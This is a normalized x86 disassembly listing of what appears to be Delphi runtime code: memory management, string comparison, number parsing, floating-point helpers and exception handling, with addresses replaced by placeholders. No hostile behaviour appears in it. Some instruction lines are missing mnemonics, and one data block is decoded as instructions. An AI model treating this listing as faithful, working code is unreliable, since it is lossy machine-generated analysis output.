pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401410
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a64
jmp r-xdata
call sub_401f40
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c50
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401eb8
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c50
sub_4024cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f40
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c50
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_402044
test al al
je r-xdata
call sub_401c50
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d14
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401eb8
jmp r-xdata
sub_4026a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402759
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401aac
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4024cc
test al al
je r-xdata
push rw-data
call sub_401408
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402198
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_402968
mov eax ebx
call sub_402328
retn
push rw-data
call sub_401410
sub_40276c
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_4028c8
sub_40278c
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_4028c8
sub_4027ac
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
mov [ ecx ] eax
mov al 0x2
jmp sub_4028c8
retn
mov [ ecx ] eax
retn
sub_40283c
push ebx
push esi
call sub_405fd0
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405fd0
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405fd0
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_40287c
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405fd0
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_402870
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402904
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402968
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4029cc
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_4029fc
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402a3c
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4028f4
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a90
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_4028f4
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_4028f4
jmp r-xdata
sub_402ae8
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_402968
pop ebx
retn
mov ecx ebx
sub_402b04
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b88
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402bf8
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c18
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402cf8
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d38
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402deb ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402deb ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402deb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403024
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403054
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401364
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4030c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40136c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40135c
retn
sub_403150
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4031f8
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403250
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4049b8
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403270
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4058b8
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4032a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403324
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403334
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40332b
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403270
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4058b8
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403334
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403378
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403418
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4033b8
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4033e8
push eax
push ecx
mov eax [ eax ]
call sub_4033b8
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f70
call [ rw-data ]
sub_403400
push esi
mov esi edx
mov eax [ eax ]
call sub_4033b8
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f70
call [ rw-data ]
sub_403448
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4033b8
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403470
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4034c0
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_403500
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403550
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403579
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035e4
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403620
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403634
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403648
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403668
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403648
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036cc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403118
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405fd0
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403634
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035e4
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4037f8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403118
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035e4
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405fd0
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403620
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b88
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403980
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403668
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039b8
or eax eax
